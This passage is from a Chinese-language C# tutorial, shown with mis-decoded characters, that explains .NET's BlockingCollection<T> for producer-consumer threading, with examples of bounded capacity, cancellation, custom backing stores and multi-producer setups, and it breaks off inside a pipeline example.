<table><thead><tr><th>åº•å±‚é›†åˆç±»å‹</th><th>é»˜è®¤</th><th>æœ‰ç•Œï¼ˆBoundedï¼‰</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>ConcurrentQueue</td><td>æ˜¯</td><td>å¯é€‰</td><td>FIFOï¼Œæ€§èƒ½æœ€é«˜</td></tr><tr><td>ConcurrentStack</td><td>å¦</td><td>å¯é€‰</td><td>LIFO</td></tr><tr><td>ConcurrentBag</td><td>å¦</td><td>å¯é€‰</td><td>æ— åºï¼Œæ’å…¥/å–å‡ºæœ€å¿«</td></tr><tr><td>è‡ªå®šä¹‰ IProducerConsumerCollection</td><td>å¦</td><td>å¯é€‰</td><td>é«˜åº¦è‡ªå®šä¹‰</td></tr></tbody></table>
<p>åœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸­ï¼Œâ€œç”Ÿäº§è€…çº¿ç¨‹ç”Ÿäº§æ•°æ®ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹æ¶ˆè´¹æ•°æ®â€ æ˜¯é«˜é¢‘åœºæ™¯ï¼ˆå¦‚æ—¥å¿—æ”¶é›†ã€ä»»åŠ¡é˜Ÿåˆ—ã€æ¶ˆæ¯å¤„ç†ï¼‰ã€‚è‹¥ç”¨æ™®é€šé›†åˆï¼ˆå¦‚<code>List&lt;T&gt;</code>ï¼‰+ æ‰‹åŠ¨é”å®ç°ï¼Œéœ€å¤„ç†ï¼š</p>
<ul>
<li>
<p>çº¿ç¨‹å®‰å…¨ï¼ˆåŠ  <code>lock</code> ï¼‰ï¼›</p>
</li>
<li>
<p>ç©ºé›†åˆæ—¶æ¶ˆè´¹è€…ç­‰å¾…ï¼ˆ<code>Monitor.Wait</code>ï¼‰ï¼›</p>
</li>
<li>
<p>æ»¡é›†åˆæ—¶ç”Ÿäº§è€…ç­‰å¾…ï¼ˆ<code>Monitor.Wait</code>ï¼‰ï¼›</p>
</li>
<li>
<p>æ•°æ®å°±ç»ªæ—¶å”¤é†’ç­‰å¾…çº¿ç¨‹ï¼ˆ<code>Monitor.Pulse</code>ï¼‰ã€‚</p>
</li>
</ul>
<p><code>BlockingCollection&lt;T&gt;</code> å°è£…äº†ä¸Šè¿°æ‰€æœ‰é€»è¾‘ï¼Œæ ¸å¿ƒä»·å€¼ï¼š</p>
<ul>
<li>
<p>å¼€ç®±å³ç”¨çš„é˜»å¡é€»è¾‘ï¼šç©ºé›†åˆæ¶ˆè´¹é˜»å¡ã€æ»¡é›†åˆç”Ÿäº§é˜»å¡ï¼›</p>
</li>
<li>
<p>çº¿ç¨‹å®‰å…¨ï¼šæ‰€æœ‰æ“ä½œï¼ˆæ·»åŠ  / ç§»é™¤ / éå†ï¼‰å‡çº¿ç¨‹å®‰å…¨ï¼›</p>
</li>
<li>
<p>æ”¯æŒè¾¹ç•Œé™åˆ¶ï¼šå¯è®¾ç½®é›†åˆæœ€å¤§å®¹é‡ï¼ˆæ»¡åˆ™é˜»å¡ç”Ÿäº§è€…ï¼‰ï¼›</p>
</li>
<li>
<p>æ”¯æŒå–æ¶ˆ / å®Œæˆï¼šå¯ä¼˜é›…åœæ­¢ç”Ÿäº§ / æ¶ˆè´¹ï¼Œé¿å…çº¿ç¨‹å¡æ­»ï¼›</p>
</li>
<li>
<p>çµæ´»çš„åº•å±‚å­˜å‚¨ï¼šé»˜è®¤åŸºäº <code>ConcurrentQueue&lt;T&gt;</code>ï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ï¼Œä¹Ÿå¯æŒ‡å®š <code>ConcurrentStack&lt;T&gt;/ConcurrentBag&lt;T&gt;</code>ã€‚</p>
</li>
</ul>
<h3 data-id="heading-3">æœ€å¸¸ç”¨çš„å‡ ç§åˆ›å»ºæ–¹å¼</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. æœ€å¸¸ç”¨ï¼šæ— ç•Œé˜Ÿåˆ—ï¼ˆæ¨èç”¨äºå¤§å¤šæ•°åœºæ™¯ï¼‰</span>
<span class="hljs-keyword">var</span> bc = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;();

<span class="hljs-comment">// 2. æœ‰ç•Œé˜Ÿåˆ—ï¼ˆé™åˆ¶å®¹é‡ï¼Œç”Ÿäº§è€…æ»¡æ—¶ä¼šé˜»å¡ï¼‰</span>
<span class="hljs-keyword">var</span> bcBounded = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(boundedCapacity: <span class="hljs-number">100</span>);

<span class="hljs-comment">// 3. æŒ‡å®šåº•å±‚é›†åˆ + æœ‰ç•Œ</span>
<span class="hljs-keyword">var</span> bcStack = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(
    <span class="hljs-keyword">new</span> ConcurrentStack&lt;<span class="hljs-built_in">string</span>&gt;(),
    boundedCapacity: <span class="hljs-number">50</span>);

<span class="hljs-comment">// 4. åŸºäºå·²æœ‰çš„é›†åˆï¼ˆé«˜çº§ç”¨æ³•ï¼‰</span>
<span class="hljs-keyword">var</span> queue = <span class="hljs-keyword">new</span> ConcurrentQueue&lt;<span class="hljs-built_in">string</span>&gt;();
<span class="hljs-keyword">var</span> bcFromExisting = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(queue, <span class="hljs-number">200</span>);
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒ API ä¸åŸºç¡€ä½¿ç”¨</h3>
<h4 data-id="heading-5">æ ¸å¿ƒæ„é€ å‡½æ•°</h4>
<ul>
<li>
<p><code>BlockingCollection&lt;T&gt;()</code>: é»˜è®¤æ„é€ ï¼šæ— è¾¹ç•Œé™åˆ¶ï¼Œåº•å±‚ç”¨ <code>ConcurrentQueue&lt;T&gt;</code></p>
</li>
<li>
<p><code>BlockingCollection&lt;T&gt;(int boundedCapacity)</code>: æŒ‡å®šæœ€å¤§å®¹é‡ï¼ˆè¾¹ç•Œï¼‰ï¼Œæ»¡åˆ™ç”Ÿäº§è€…é˜»å¡</p>
</li>
<li>
<p><code>BlockingCollection&lt;T&gt;(IProducerConsumerCollection&lt;T&gt;)</code>: è‡ªå®šä¹‰åº•å±‚å­˜å‚¨ï¼ˆå¦‚<code>ConcurrentStack&lt;T&gt;</code>ï¼‰</p>
</li>
<li>
<p><code>BlockingCollection&lt;T&gt;(IProducerConsumerCollection&lt;T&gt;, int)</code>: è‡ªå®šä¹‰å­˜å‚¨ + æœ€å¤§å®¹é‡</p>
</li>
</ul>
<h4 data-id="heading-6">æ ¸å¿ƒæ–¹æ³• / å±æ€§</h4>
<ul>
<li>
<p><code>Add(T item)</code>: å‘é›†åˆæ·»åŠ å…ƒç´ ï¼šè‹¥é›†åˆæ»¡åˆ™é˜»å¡ï¼Œç›´åˆ°æœ‰ç©ºé—´</p>
</li>
<li>
<p><code>Add(T item, CancellationToken)</code>: å¸¦å–æ¶ˆä»¤ç‰Œçš„ Addï¼šå¯ä¸­é€”å–æ¶ˆé˜»å¡</p>
</li>
<li>
<p><code>Take()</code>: ä»é›†åˆç§»é™¤å¹¶è¿”å›å…ƒç´ ï¼šè‹¥é›†åˆç©ºåˆ™é˜»å¡ï¼Œç›´åˆ°æœ‰å…ƒç´ </p>
</li>
<li>
<p><code>Take(CancellationToken)</code>: å¸¦å–æ¶ˆä»¤ç‰Œçš„ Takeï¼šå¯ä¸­é€”å–æ¶ˆé˜»å¡</p>
</li>
<li>
<p><code>TryAdd(T item, int millisecondsTimeout)</code>: å°è¯•æ·»åŠ ï¼šè¶…æ—¶è¿”å› falseï¼ˆéé˜»å¡ï¼‰</p>
</li>
<li>
<p><code>TryTake(out T item, int millisecondsTimeout)</code>: å°è¯•è·å–ï¼šè¶…æ—¶è¿”å› falseï¼ˆéé˜»å¡ï¼‰</p>
</li>
<li>
<p><code>CompleteAdding()</code>: æ ‡è®° â€œæ·»åŠ å®Œæˆâ€ï¼šåç»­ Add ä¼šæŠ›å¼‚å¸¸ï¼ŒTake åœ¨é›†åˆç©ºåé€€å‡º</p>
</li>
<li>
<p><code>IsAddingCompleted</code>: åˆ¤æ–­æ˜¯å¦å·²è°ƒç”¨ <code>CompleteAdding()</code></p>
</li>
<li>
<p><code>IsCompleted</code>: åˆ¤æ–­æ˜¯å¦ â€œæ·»åŠ å®Œæˆä¸”é›†åˆä¸ºç©ºâ€</p>
</li>
<li>
<p><code>BoundedCapacity</code>: é›†åˆæœ€å¤§å®¹é‡ï¼ˆ-1 è¡¨ç¤ºæ— é™åˆ¶ï¼‰</p>
</li>
</ul>
<h4 data-id="heading-7">æ ¸å¿ƒæ“ä½œæ–¹æ³•</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CoreOperations</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DemonstrateOperations</span>()</span>
    {
        <span class="hljs-keyword">var</span> collection = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(boundedCapacity: <span class="hljs-number">3</span>);
        
        <span class="hljs-comment">// 1. æ·»åŠ é¡¹ç›®</span>
        collection.Add(<span class="hljs-string">"é¡¹ç›®1"</span>); <span class="hljs-comment">// é˜»å¡ç›´åˆ°æœ‰ç©ºé—´</span>
        
        <span class="hljs-comment">// 2. å°è¯•æ·»åŠ ï¼ˆä¸é˜»å¡ï¼‰</span>
        <span class="hljs-built_in">bool</span> added = collection.TryAdd(<span class="hljs-string">"é¡¹ç›®2"</span>, millisecondsTimeout: <span class="hljs-number">0</span>);
        Console.WriteLine(<span class="hljs-string">$"å°è¯•æ·»åŠ ç»“æœ: <span class="hljs-subst">{added}</span>"</span>);
        
        <span class="hljs-comment">// 3. å¸¦è¶…æ—¶çš„æ·»åŠ </span>
        <span class="hljs-built_in">bool</span> addedWithTimeout = collection.TryAdd(<span class="hljs-string">"é¡¹ç›®3"</span>, 
            millisecondsTimeout: <span class="hljs-number">1000</span>); <span class="hljs-comment">// æœ€å¤šç­‰å¾…1ç§’</span>
        Console.WriteLine(<span class="hljs-string">$"å¸¦è¶…æ—¶æ·»åŠ ç»“æœ: <span class="hljs-subst">{addedWithTimeout}</span>"</span>);
        
        <span class="hljs-comment">// 4. å–å‡ºé¡¹ç›®ï¼ˆé˜»å¡ï¼‰</span>
        <span class="hljs-built_in">string</span> item1 = collection.Take(); <span class="hljs-comment">// é˜»å¡ç›´åˆ°æœ‰é¡¹ç›®å¯å–</span>
        Console.WriteLine(<span class="hljs-string">$"å–å‡º: <span class="hljs-subst">{item1}</span>"</span>);
        
        <span class="hljs-comment">// 5. å°è¯•å–å‡ºï¼ˆä¸é˜»å¡ï¼‰</span>
        <span class="hljs-built_in">bool</span> taken = collection.TryTake(<span class="hljs-keyword">out</span> <span class="hljs-built_in">string</span> item2, millisecondsTimeout: <span class="hljs-number">0</span>);
        Console.WriteLine(<span class="hljs-string">$"å°è¯•å–å‡ºç»“æœ: <span class="hljs-subst">{taken}</span>, é¡¹ç›®: <span class="hljs-subst">{item2}</span>"</span>);
        
        <span class="hljs-comment">// 6. æŸ¥çœ‹ä½†ä¸ç§»é™¤</span>
        <span class="hljs-built_in">bool</span> peeked = collection.TryPeek(<span class="hljs-keyword">out</span> <span class="hljs-built_in">string</span> item3);
        Console.WriteLine(<span class="hljs-string">$"æŸ¥çœ‹ç»“æœ: <span class="hljs-subst">{peeked}</span>, é¡¹ç›®: <span class="hljs-subst">{item3}</span>"</span>);
        
        <span class="hljs-comment">// 7. å®Œæˆæ·»åŠ </span>
        collection.CompleteAdding();
        Console.WriteLine(<span class="hljs-string">$"IsAddingCompleted: <span class="hljs-subst">{collection.IsAddingCompleted}</span>"</span>);
        Console.WriteLine(<span class="hljs-string">$"IsCompleted: <span class="hljs-subst">{collection.IsCompleted}</span>"</span>);
        
        <span class="hljs-comment">// 8. è·å–å½“å‰æ‰€æœ‰é¡¹ç›®ï¼ˆä¸é˜»å¡ï¼‰</span>
        <span class="hljs-built_in">string</span>[] allItems = collection.ToArray();
        Console.WriteLine(<span class="hljs-string">$"å½“å‰é¡¹ç›®æ•°: <span class="hljs-subst">{allItems.Length}</span>"</span>);
    }
}
</code></pre>
<h4 data-id="heading-8">åŸºç¡€ç¤ºä¾‹ï¼šç®€å•ç”Ÿäº§è€… - æ¶ˆè´¹è€…</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Collections.Concurrent;
<span class="hljs-keyword">using</span> System.Threading;
<span class="hljs-keyword">using</span> System.Threading.Tasks;

<span class="hljs-keyword">class</span> <span class="hljs-title">BlockingCollectionBasicDemo</span>
{
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
    {
        <span class="hljs-comment">// åˆ›å»ºé˜»å¡é›†åˆï¼Œæœ€å¤§å®¹é‡ä¸º5ï¼ˆæ»¡åˆ™ç”Ÿäº§è€…é˜»å¡ï¼‰</span>
        <span class="hljs-keyword">var</span> bc = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">int</span>&gt;(<span class="hljs-number">5</span>);

        <span class="hljs-comment">// 1. ç”Ÿäº§è€…çº¿ç¨‹ï¼šç”Ÿäº§1-10çš„æ•°å­—</span>
        Task producer = Task.Run(() =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++)
            {
                bc.Add(i); <span class="hljs-comment">// æ»¡åˆ™é˜»å¡</span>
                Console.WriteLine(<span class="hljs-string">$"ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-subst">{i}</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-subst">{bc.Count}</span>"</span>);
                Thread.Sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// æ¨¡æ‹Ÿç”Ÿäº§è€—æ—¶</span>
            }
            <span class="hljs-comment">// æ ‡è®°æ·»åŠ å®Œæˆï¼šæ¶ˆè´¹è€…çŸ¥é“ä¸ä¼šæœ‰æ–°æ•°æ®äº†</span>
            bc.CompleteAdding();
            Console.WriteLine(<span class="hljs-string">"ç”Ÿäº§è€…ï¼šå®Œæˆæ‰€æœ‰ç”Ÿäº§ï¼Œæ ‡è®°æ·»åŠ å®Œæˆ"</span>);
        });

        <span class="hljs-comment">// 2. æ¶ˆè´¹è€…çº¿ç¨‹ï¼šæ¶ˆè´¹æ‰€æœ‰æ•°å­—</span>
        Task consumer = Task.Run(() =&gt;
        {
            <span class="hljs-comment">// GetConsumingEnumerable()ï¼šéå†é›†åˆï¼Œç©ºåˆ™é˜»å¡ï¼Œç›´åˆ°CompleteAddingä¸”ç©º</span>
            <span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">int</span> item <span class="hljs-keyword">in</span> bc.GetConsumingEnumerable())
            {
                Console.WriteLine(<span class="hljs-string">$"æ¶ˆè´¹è€…ï¼šæ¶ˆè´¹ <span class="hljs-subst">{item}</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-subst">{bc.Count}</span>"</span>);
                Thread.Sleep(<span class="hljs-number">500</span>); <span class="hljs-comment">// æ¨¡æ‹Ÿæ¶ˆè´¹è€—æ—¶ï¼ˆæ¯”ç”Ÿäº§æ…¢ï¼Œä¼šå¯¼è‡´é›†åˆå †ç§¯ï¼‰</span>
            }
            Console.WriteLine(<span class="hljs-string">"æ¶ˆè´¹è€…ï¼šæ‰€æœ‰æ•°æ®æ¶ˆè´¹å®Œæˆ"</span>);
        });

        <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span>
        Task.WaitAll(producer, consumer);
        bc.Dispose(); <span class="hljs-comment">// é‡Šæ”¾èµ„æº</span>
    }
}
</code></pre>
<p>è¾“å‡ºç»“æœ</p>
<pre><code class="hljs language-arduino" lang="arduino">ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">1</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">1</span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">2</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">2</span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">3</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">3</span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">4</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">4</span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">5</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">5</span>
æ¶ˆè´¹è€…ï¼šæ¶ˆè´¹ <span class="hljs-number">1</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">4</span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">6</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">5</span>  <span class="hljs-comment">// æ¶ˆè´¹åè…¾å‡ºç©ºé—´ï¼Œç”Ÿäº§è€…ç»§ç»­æ·»åŠ </span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">7</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">5</span>  <span class="hljs-comment">// é›†åˆå†æ¬¡æ»¡ï¼Œç”Ÿäº§è€…é˜»å¡</span>
æ¶ˆè´¹è€…ï¼šæ¶ˆè´¹ <span class="hljs-number">2</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">4</span>
ç”Ÿäº§è€…ï¼šæ·»åŠ  <span class="hljs-number">8</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">5</span>
...ï¼ˆåç»­ä¾æ¬¡æ¶ˆè´¹å’Œç”Ÿäº§ï¼‰
ç”Ÿäº§è€…ï¼šå®Œæˆæ‰€æœ‰ç”Ÿäº§ï¼Œæ ‡è®°æ·»åŠ å®Œæˆ
æ¶ˆè´¹è€…ï¼šæ¶ˆè´¹ <span class="hljs-number">10</span>ï¼Œå½“å‰é›†åˆæ•°é‡ï¼š<span class="hljs-number">0</span>
æ¶ˆè´¹è€…ï¼šæ‰€æœ‰æ•°æ®æ¶ˆè´¹å®Œæˆ
</code></pre>
<p>æ ¸å¿ƒç°è±¡ï¼š</p>
<ul>
<li>
<p>é›†åˆå®¹é‡è®¾ä¸º 5ï¼Œç”Ÿäº§è€…æ·»åŠ åˆ° 5 ä¸ªåé˜»å¡ï¼Œç›´åˆ°æ¶ˆè´¹è€…æ¶ˆè´¹ 1 ä¸ªè…¾å‡ºç©ºé—´ï¼›</p>
</li>
<li>
<p><code>GetConsumingEnumerable()</code> è‡ªåŠ¨å¤„ç†é˜»å¡é€»è¾‘ï¼Œæ— éœ€æ‰‹åŠ¨åˆ¤æ–­é›†åˆæ˜¯å¦ä¸ºç©ºï¼›</p>
</li>
<li>
<p><code>CompleteAdding()</code> åï¼Œæ¶ˆè´¹è€…éå†å®Œå‰©ä½™æ•°æ®å³é€€å‡ºï¼Œä¸ä¼šæ— é™é˜»å¡ã€‚</p>
</li>
</ul>
<h3 data-id="heading-9">é«˜çº§ç”¨æ³•è¯¦è§£</h3>
<h4 data-id="heading-10">è¾¹ç•Œé™åˆ¶ï¼ˆBounded Capacityï¼‰</h4>
<p>é€šè¿‡æ„é€ å‡½æ•°æŒ‡å®š <code>boundedCapacity</code>ï¼Œå®ç° â€œç”Ÿäº§è€…é™æµâ€ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æœ€å¤§å®¹é‡3ï¼Œæ»¡åˆ™ç”Ÿäº§è€…é˜»å¡</span>
<span class="hljs-keyword">var</span> bc = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-number">3</span>);

<span class="hljs-comment">// ç”Ÿäº§è€…1ï¼šå¿«é€Ÿæ·»åŠ 3ä¸ªå…ƒç´ ï¼Œç¬¬4ä¸ªä¼šé˜»å¡</span>
Task.Run(() =&gt;
{
    bc.Add(<span class="hljs-string">"A"</span>);
    bc.Add(<span class="hljs-string">"B"</span>);
    bc.Add(<span class="hljs-string">"C"</span>);
    Console.WriteLine(<span class="hljs-string">"ç”Ÿäº§è€…1ï¼šå·²æ·»åŠ 3ä¸ªï¼Œå‡†å¤‡æ·»åŠ ç¬¬4ä¸ªï¼ˆä¼šé˜»å¡ï¼‰"</span>);
    bc.Add(<span class="hljs-string">"D"</span>); <span class="hljs-comment">// é˜»å¡ï¼Œç›´åˆ°æ¶ˆè´¹è€…æ¶ˆè´¹ä¸€ä¸ª</span>
    Console.WriteLine(<span class="hljs-string">"ç”Ÿäº§è€…1ï¼šç¬¬4ä¸ªå…ƒç´ æ·»åŠ æˆåŠŸ"</span>);
});

<span class="hljs-comment">// æ¶ˆè´¹è€…1ï¼š2ç§’åæ¶ˆè´¹ä¸€ä¸ªå…ƒç´ </span>
Task.Run(() =&gt;
{
    Thread.Sleep(<span class="hljs-number">2000</span>);
    <span class="hljs-keyword">var</span> item = bc.Take();
    Console.WriteLine(<span class="hljs-string">$"æ¶ˆè´¹è€…1ï¼šæ¶ˆè´¹ <span class="hljs-subst">{item}</span>"</span>);
});
</code></pre>
<h4 data-id="heading-11">å–æ¶ˆé˜»å¡ï¼ˆCancellationTokenï¼‰</h4>
<p>ç”¨ <code>CancellationToken</code> ä¸­æ–­é˜»å¡çš„ <code>Add/Take</code> æ“ä½œï¼Œé¿å…çº¿ç¨‹æ°¸ä¹…é˜»å¡ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> cts = <span class="hljs-keyword">new</span> CancellationTokenSource();
<span class="hljs-comment">// 3ç§’åå–æ¶ˆ</span>
cts.CancelAfter(<span class="hljs-number">3000</span>);

<span class="hljs-keyword">var</span> bc = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">int</span>&gt;();

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šå°è¯•æ·»åŠ ï¼Œ3ç§’åå–æ¶ˆ</span>
Task.Run(() =&gt;
{
    <span class="hljs-keyword">try</span>
    {
        <span class="hljs-comment">// é›†åˆæ— è¾¹ç•Œï¼Œæ­¤å¤„ä¸ä¼šé˜»å¡ï¼Œä½†æ¼”ç¤ºå–æ¶ˆé€»è¾‘</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">1</span>; ; i++)
        {
            bc.Add(i, cts.Token);
            Console.WriteLine(<span class="hljs-string">$"æ·»åŠ  <span class="hljs-subst">{i}</span>"</span>);
            Thread.Sleep(<span class="hljs-number">500</span>);
        }
    }
    <span class="hljs-keyword">catch</span> (OperationCanceledException)
    {
        Console.WriteLine(<span class="hljs-string">"ç”Ÿäº§è€…ï¼šæ·»åŠ æ“ä½œè¢«å–æ¶ˆ"</span>);
        bc.CompleteAdding();
    }
});

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šå°è¯•æ¶ˆè´¹ï¼Œ3ç§’åå–æ¶ˆ</span>
Task.Run(() =&gt;
{
    <span class="hljs-keyword">try</span>
    {
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)
        {
            <span class="hljs-built_in">int</span> item = bc.Take(cts.Token);
            Console.WriteLine(<span class="hljs-string">$"æ¶ˆè´¹ <span class="hljs-subst">{item}</span>"</span>);
        }
    }
    <span class="hljs-keyword">catch</span> (OperationCanceledException)
    {
        Console.WriteLine(<span class="hljs-string">"æ¶ˆè´¹è€…ï¼šæ¶ˆè´¹æ“ä½œè¢«å–æ¶ˆ"</span>);
    }
});
</code></pre>
<h4 data-id="heading-12">è‡ªå®šä¹‰åº•å±‚å­˜å‚¨</h4>
<p>é»˜è®¤åº•å±‚æ˜¯ <code>ConcurrentQueue&lt;T&gt;</code>ï¼ˆFIFOï¼‰ï¼Œå¯æŒ‡å®š <code>ConcurrentStack&lt;T&gt;</code>ï¼ˆLIFOï¼‰æˆ– <code>ConcurrentBag&lt;T&gt;</code>ï¼ˆæ— åºï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åº•å±‚ç”¨ConcurrentStackï¼ˆæ ˆï¼šåè¿›å…ˆå‡ºï¼‰</span>
<span class="hljs-keyword">var</span> bc = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">int</span>&gt;(<span class="hljs-keyword">new</span> ConcurrentStack&lt;<span class="hljs-built_in">int</span>&gt;());

bc.Add(<span class="hljs-number">1</span>);
bc.Add(<span class="hljs-number">2</span>);
bc.Add(<span class="hljs-number">3</span>);

<span class="hljs-comment">// Takeä¼šè·å–æœ€åæ·»åŠ çš„3ï¼ˆæ ˆé¡¶ï¼‰</span>
Console.WriteLine(bc.Take()); <span class="hljs-comment">// è¾“å‡ºï¼š3</span>
Console.WriteLine(bc.Take()); <span class="hljs-comment">// è¾“å‡ºï¼š2</span>
Console.WriteLine(bc.Take()); <span class="hljs-comment">// è¾“å‡ºï¼š1</span>
</code></pre>
<h4 data-id="heading-13">å¤šç”Ÿäº§è€… / å¤šæ¶ˆè´¹è€…</h4>
<p><code>BlockingCollection&lt;T&gt;</code> å¤©ç„¶æ”¯æŒå¤šç”Ÿäº§è€…ã€å¤šæ¶ˆè´¹è€…å¹¶å‘æ“ä½œï¼Œæ— éœ€é¢å¤–åŒæ­¥ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> bc = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">int</span>&gt;(<span class="hljs-number">10</span>);

<span class="hljs-comment">// 3ä¸ªç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)
{
    <span class="hljs-built_in">int</span> producerId = i + <span class="hljs-number">1</span>;
    Task.Run(() =&gt;
    {
        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">5</span>; j++)
        {
            <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span> = producerId * <span class="hljs-number">100</span> + j;
            bc.Add(<span class="hljs-keyword">value</span>);
            Console.WriteLine(<span class="hljs-string">$"ç”Ÿäº§è€…<span class="hljs-subst">{producerId}</span>ï¼šæ·»åŠ  <span class="hljs-subst">{<span class="hljs-keyword">value</span>}</span>"</span>);
            Thread.Sleep(<span class="hljs-number">100</span>);
        }
    });
}

<span class="hljs-comment">// 2ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)
{
    <span class="hljs-built_in">int</span> consumerId = i + <span class="hljs-number">1</span>;
    Task.Run(() =&gt;
    {
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> bc.GetConsumingEnumerable())
        {
            Console.WriteLine(<span class="hljs-string">$"æ¶ˆè´¹è€…<span class="hljs-subst">{consumerId}</span>ï¼šæ¶ˆè´¹ <span class="hljs-subst">{item}</span>"</span>);
            Thread.Sleep(<span class="hljs-number">200</span>);
        }
    });
}

<span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ç”Ÿäº§è€…å®Œæˆåæ ‡è®°æ·»åŠ å®Œæˆ</span>
Task.Delay(<span class="hljs-number">2000</span>).ContinueWith(_ =&gt; bc.CompleteAdding());
</code></pre>
<h4 data-id="heading-14">æ•°æ®æµæ°´çº¿ï¼ˆPipelineï¼‰æ¨¡å¼</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DataPipelineExample</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RunPipeline</span>()</span>
    {
        <span class="hljs-comment">// åˆ›å»ºä¸‰ä¸ªé˜¶æ®µçš„æµæ°´çº¿</span>
        <span class="hljs-keyword">var</span> stage1 = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(boundedCapacity: <span class="hljs-number">10</span>);
        <span class="hljs-keyword">var</span> stage2 = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(boundedCapacity: <span class="hljs-number">10</span>);
        <span class="hljs-keyword">var</span> stage3 = <span class="hljs-keyword">new</span> BlockingCollection&lt;<span class="hljs-built_in">string</span>&gt;(boundedCapacity: <span class="hljs-number">10</span>);
        
        CancellationTokenSource cts = <span class="hljs-keyword">new</span> CancellationTokenSource();
        
        <span class="hljs-comment">// é˜¶æ®µ1ï¼šæ•°æ®æº</span>
        <span class="hljs-keyword">var</span> sourceTask = Task.Run(() =&gt;
        {
            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">20</span>; i++)
                {
